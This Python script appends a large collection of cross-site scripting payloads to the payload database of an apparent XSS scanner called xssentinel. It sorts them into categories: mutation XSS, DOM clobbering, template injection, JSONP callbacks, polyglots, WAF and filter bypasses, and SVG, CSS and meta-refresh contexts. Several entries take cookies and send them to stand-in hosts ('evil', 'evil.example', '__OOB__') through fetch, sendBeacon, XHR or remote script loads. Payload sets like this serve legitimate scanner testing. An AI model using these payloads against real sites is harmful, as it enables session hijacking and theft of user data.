"""Extend payloads.json with new categories (mXSS, DOM clobber, template,
JSONP, polyglot, modern bypasses).  Idempotent: skips payloads whose
`payload` text already exists."""
import json, os, sys

PATH = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                    "xssentinel", "data", "payloads.json")

with open(PATH, "r", encoding="utf-8") as f:
    data = json.load(f)

existing = {p["payload"] for p in data["payloads"]}
added = 0

def add(context, payload, tags, confidence=0.7, note=""):
    global added
    if payload in existing:
        return
    pid = f"{context}_{len(data['payloads'])+1:04d}"
    data["payloads"].append({
        "id": pid,
        "context": context,
        "payload": payload,
        "tags": tags,
        "confidence": confidence,
        "note": note,
    })
    existing.add(payload)
    added += 1

# --- mXSS payloads ---------------------------------------------------------
mxss = [
    "<svg><style><img src=x onerror=alert(1)></style>",
    "<math><style><img src=x onerror=alert(1)></style>",
    "<noscript><img src=x onerror=alert(1)></noscript>",
    "<template><img src=x onerror=alert(1)></template>",
    "<svg><desc><img src=x onerror=alert(1)></desc></svg>",
    "<svg><style></style><img src=x onerror=alert(1)></svg>",
    "<svg><foreignObject><form><img src=x onerror=alert(1)></form></foreignObject></svg>",
    "<svg><style>/*</style>*/<img src=x onerror=alert(1)></svg>",
    "<img src=`x`onerror=alert(1)>",
    "<img src=x\\ onerror=alert(1)>",
    "<svg><title><img src=x onerror=alert(1)></title></svg>",
    "<svg><a><rect width=100 height=100 /></a></svg>",
]
for p in mxss:
    add("html_element", p, ["mxss", "svg", "mutation"],
        confidence=0.8, note="mXSS: fires after parser re-serialization")

# --- DOM clobber -----------------------------------------------------------
clobbers = [
    '<a id=x href="javascript:alert(1)">x</a>',
    '<a id=location href="javascript:alert(1)">x</a>',
    '<img id=x name=x src=x onerror=alert(1)>',
    '<form id=x><input name=action value="javascript:alert(1)"></form>',
    '<form id=x><input name=x></form>',
    '<a id=cookie href="javascript:alert(1)">x</a>',
    '<img id=x src=x onerror=alert(1)>',
    '<img id=x data-x="javascript:alert(1)">',
    '<form id=x><input name=attributes></form>',
    '<a id=x name=x href="javascript:alert(1)">x</a>',
]
for p in clobbers:
    add("html_element", p, ["dom_clobber", "id_shadow"],
        confidence=0.7, note="DOM clobber: shadows window/document property")

# --- Template SSTI ---------------------------------------------------------
templates = [
    "{{constructor.constructor('alert(1)')()}}",
    "{{7*7}}",
    "{{_c('img',{attrs:{src:x,onerror:alert(1)}})}",
    "{{#with 'constructor.constructor(\"alert(1)\")()'}}{{.}}{{/with}}",
    "<%=alert(1)%>",
    "{{=alert(1)}}",
    "{alert(1)}",
    "#{alert(1)}",
    "#{7*7}",
    "{{_self.env.registerUndefinedFilterCallback('alert')}}{{_self.env.getFilter('1')}}",
    "{{''.constructor.constructor('alert(1)')()}}",
    "${7*7}",
    "#{7*7}",
    "{{ 'a'.constructor.prototype.charAt='.'}}",
    "*{7*7}",
]
for p in templates:
    add("template_angular", p, ["ssti", "template", "client_side"],
        confidence=0.8, note="Client-side template injection -> XSS")

# --- JSONP callback --------------------------------------------------------
# These are not typical payloads; they're callback-name injections.
# Use script_template context since they execute as script.
jsonps = [
    "alert(1)//",
    "alert(1);",
    "alert(document.domain)//",
    "window.top.alert(1)//",
    "function(){alert(1)}//",
    "x;alert(1);//",
    "fetch('//evil/?c='+document.cookie)//",
]
for p in jsonps:
    add("script_block", p, ["jsonp", "callback"],
        confidence=0.7, note="JSONP callback name injection")

# --- Polyglots -------------------------------------------------------------
polyglots = [
    "</script></style>\"'><svg/onload=alert(1)>",
    "';</script><svg/onload=alert(1)>",
    "</style><svg/onload=alert(1)>",
    "' onmouseover='alert(1)' x='",
    "javascript:alert(1)//",
    "'\"><svg/onload=alert(1)>",
    "alert(1)//</script><svg/onload=alert(1)>",
    "--><svg/onload=alert(1)>",
    "![CDATA[<svg/onload=alert(1)>",
]
for p in polyglots:
    add("html_element", p, ["polyglot", "multi_context"],
        confidence=0.85, note="Polyglot: executes in multiple contexts")

# --- Modern WAF/filter bypass ---------------------------------------------
bypasses = [
    "<Script/x=alert(1)>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<svg/onload=alert(1)>",
    "<SVG/ONLOAD=alert(1)>",
    "<img src=x:alert(1) onerror=eval(src)>",
    "<img src=x onerror=window['ale'+'rt'](1)>",
    "<svg><script>alert(1)</script></svg>",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style>",
    "<form><button formaction=javascript:alert(1)>x</button></form>",
    "<iframe src=javascript:alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<keygen onfocus=alert(1) autofocus>",
    "<video><source onerror=alert(1)>",
    "<video poster=javascript:alert(1)>",
    "<img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">",
    "<a href=\"javascript:alert(1)\">x</a>",
    "<a href=\"jaVaScRiPt:alert(1)\">x</a>",
    "<a href=\"jav\tascript:alert(1)\">x</a>",
    "<a href=\"jav&#x09;ascript:alert(1)\">x</a>",
    "<a href=\"data:text/html,<script>alert(1)</script>\">x</a>",
    "<img src=\"data:image/svg+xml,<svg onload=alert(1)/>\">",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<svg><animateTransform onbegin=alert(1) attributeName=transform dur=1s>",
    "<svg><discard onbegin=alert(1)>",
    "<svg><set onbegin=alert(1) attributeName=x>",
    "<svg><a><animate href=javascript:alert(1) attributeName=xlink:href dur=1s>",
    "<style>@import 'javascript:alert(1)';</style>",
    "<style>*{background:url(javascript:alert(1))}</style>",
    "<link rel=stylesheet href=javascript:alert(1)>",
    "<link rel=import href=javascript:alert(1)>",
    "<base href=javascript:alert(1)//>",
    "<meta http-equiv=refresh content=0;javascript:alert(1)>",
    "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
    "<isindex action=javascript:alert(1) type=submit value=x>",
    "<table background=javascript:alert(1)></table>",
    "<td background=javascript:alert(1)></td>",
    "<script/src=data:,alert(1)>",
    "<script src=//evil.example/x.js>",
    "<script>alert(1)</script>",
    "<script>function x(){alert(1)}x()</script>",
    "<script>throw/onerror=alert(1)>'x'</script>",
    "<script>{onerror=alert}throw 1</script>",
    "<script>window.onerror=alert;throw 1</script>",
    "<script>eval(location.hash.slice(1))</script>",
    "<script>eval(name)</script>",
    "<script>eval(location.search.slice(1))</script>",
    "<script>document.write(location.hash.slice(1))</script>",
    "<script>document.body.innerHTML=location.hash.slice(1)</script>",
    "<script>fetch('https://evil/?c='+document.cookie)</script>",
]
for p in bypasses:
    add("html_element", p, ["bypass", "waf_evasion", "modern"],
        confidence=0.8, note="Modern WAF/filter bypass payload")

# --- Script-block specific (different context) ----------------------------
script_bypasses = [
    "alert(1)",
    "alert(document.domain)",
    "alert(document.cookie)",
    "prompt(1)",
    "confirm(1)",
    "print(1)",
    "window.onerror=alert;throw/1/",
    "window.onerror=alert;throw'1'",
    "onerror=alert;throw 1",
    "throw/onerror=alert,1",
    "{onerror=alert}throw 1",
    "eval('ale'+'rt(1)')",
    "eval(atob('YWxlcnQoMSk='))",
    "Function('alert(1)')()",
    "new Function('alert(1)')()",
    "setTimeout('alert(1)',0)",
    "setInterval('alert(1)',9999)",
    "requestAnimationFrame('alert(1)')",
    "window.name='alert(1)';eval(name)",
    "location='javascript:alert(1)'",
    "document.location='javascript:alert(1)'",
    "window.location='javascript:alert(1)'",
    "top.location='javascript:alert(1)'",
]
for p in script_bypasses:
    add("script_block", p, ["bypass", "js_sink"],
        confidence=0.75, note="JS code-context bypass payload")

# --- URL / javascript: scheme ----------------------------------------------
url_bypasses = [
    "javascript:alert(1)",
    "javascript:alert(document.domain)",
    "javascript:alert(document.cookie)",
    "javascript:eval('alert(1)')",
    "javascript:Function('alert(1)')()",
    "javascript:window.name='alert(1)';eval(name)",
    "javascript:fetch('https://evil/?c='+document.cookie)",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "vbscript:msgbox(1)",
    "javascript:void(alert(1))",
    "javascript://%0aalert(1)",
    "javascript:/*--></script></style><svg/onload=alert(1)>",
]
for p in url_bypasses:
    add("url_javascript", p, ["url_scheme", "javascript"],
        confidence=0.85, note="javascript:/data: URL scheme payload")

# --- CSS context -----------------------------------------------------------
css_bypasses = [
    "</style><svg/onload=alert(1)>",
    "</style><script>alert(1)</script>",
    "url(javascript:alert(1))",
    "url(data:text/html,<script>alert(1)</script>)",
    "expression(alert(1))",
    "-moz-binding:url(https://evil/x.xml#xss)",
    "@import 'javascript:alert(1)';",
    "background:url(javascript:alert(1))",
    "background-image:url(javascript:alert(1))",
]
for p in css_bypasses:
    add("css_context", p, ["css", "style"],
        confidence=0.7, note="CSS context payload")

# --- HTML comment ----------------------------------------------------------
comment_bypasses = [
    "--><svg/onload=alert(1)>",
    "--!><svg/onload=alert(1)>",
    "<![CDATA[<svg/onload=alert(1)>",
    "<![CDATA[-->",
    "<!--<svg onload=alert(1)>-->",
]
for p in comment_bypasses:
    add("html_comment", p, ["comment"],
        confidence=0.7, note="HTML comment breakout payload")

# --- SVG-specific ----------------------------------------------------------
svg_bypasses = [
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<svg><animateTransform onbegin=alert(1) attributeName=transform dur=1s>",
    "<svg><discard onbegin=alert(1)>",
    "<svg><set onbegin=alert(1) attributeName=x>",
    "<svg><a><animate href=javascript:alert(1) attributeName=xlink:href dur=1s>",
    "<svg><use href=javascript:alert(1)>",
    "<svg><use xlink:href=javascript:alert(1)>",
    "<svg><image href=javascript:alert(1)>",
    "<svg><foreignObject><body onload=alert(1)>",
    "<svg><foreignObject><script>alert(1)</script></foreignObject>",
    "<svg><style>*{background:url(javascript:alert(1))}</style></svg>",
    "<svg><a xlink:href=javascript:alert(1)>x</a>",
]
for p in svg_bypasses:
    add("svg_context", p, ["svg", "foreign_content"],
        confidence=0.85, note="SVG-context payload")

# --- Meta refresh ----------------------------------------------------------
meta_bypasses = [
    "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
    "<meta http-equiv=refresh content=0;url=data:text/html,<script>alert(1)</script>>",
    "<meta http-equiv=refresh content=0;javascript:alert(1)>",
    "<meta http-equiv=Set-Cookie content=x=y>",
    "<meta charset=javascript:alert(1)>",
]
for p in meta_bypasses:
    add("meta_refresh", p, ["meta", "redirect"],
        confidence=0.7, note="Meta refresh / header injection payload")

# --- Blind/OOB (additional) ------------------------------------------------
blind_extra = [
    "<script src=https://__OOB__/x.js></script>",
    "<img src=https://__OOB__/x>",
    "<svg/onload=\"fetch('https://__OOB__/?c='+document.cookie)\">",
    "<script>new Image().src='https://__OOB__/?c='+document.cookie</script>",
    "<script>fetch('https://__OOB__/',{method:'POST',body:document.cookie})</script>",
    "<script>navigator.sendBeacon('https://__OOB__',document.cookie)</script>",
    "<script>new XMLHttpRequest().open('GET','https://__OOB__/?c='+document.cookie);send()</script>",
    "<link rel=stylesheet href=https://__OOB__/x.css>",
    "<style>@import url(https://__OOB__/x.css);</style>",
    "<object data=https://__OOB__/x>",
    "<embed src=https://__OOB__/x>",
    "<iframe src=https://__OOB__/x>",
    "<video poster=https://__OOB__/x>",
    "<source src=https://__OOB__/x>",
    "<input type=image src=https://__OOB__/x>",
    "<body background=https://__OOB__/x>",
    "<table background=https://__OOB__/x>",
    "<td background=https://__OOB__/x>",
    "<bgsound src=https://__OOB__/x>",
    "<img src=x onerror=\"s=document.createElement('script');s.src='https://__OOB__/x';document.body.appendChild(s)\">",
]
for p in blind_extra:
    add("blind_oob", p, ["blind", "oob", "callback"],
        confidence=0.85, note="Blind XSS OOB callback payload")

# --- Filter-specific -------------------------------------------------------
filters = [
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<scr\x00ipt>alert(1)</scr\x00ipt>",
    "<scrip<script>t>alert(1)</scrip</script>t>",
    "<script<script>>alert(1)</script>",
    "<<script>script>alert(1)//<</script>",
    "<script/<script>>alert(1)</script>",
    "<svg<script>>alert(1)</svg>",
    "<img<script> src=x onerror=alert(1)>",
    "<scri pt>alert(1)</scri pt>",
    "<scri\npt>alert(1)</scri\npt>",
    "<scri\tpt>alert(1)</scri\tpt>",
    "<svg/onload%3dalert(1)>",
    "<svg/onload%3Dalert(1)>",
    "<svg%2fonload=alert(1)>",
    "<svg onload%20=alert(1)>",
    "<svg/onload\t=alert(1)>",
    "<svg/onload\n=alert(1)>",
    "<svg/onload\r=alert(1)>",
]
for p in filters:
    add("html_element", p, ["filter_bypass", "nested", "encoding"],
        confidence=0.75, note="Filter bypass via nesting/encoding")

with open(PATH, "w", encoding="utf-8") as f:
    json.dump(data, f, indent=2, ensure_ascii=False)

print(f"[+] Added {added} payloads (total: {len(data['payloads'])})")
contexts = sorted(set(p["context"] for p in data["payloads"]))
print(f"[+] Contexts: {len(contexts)} -> {contexts}")
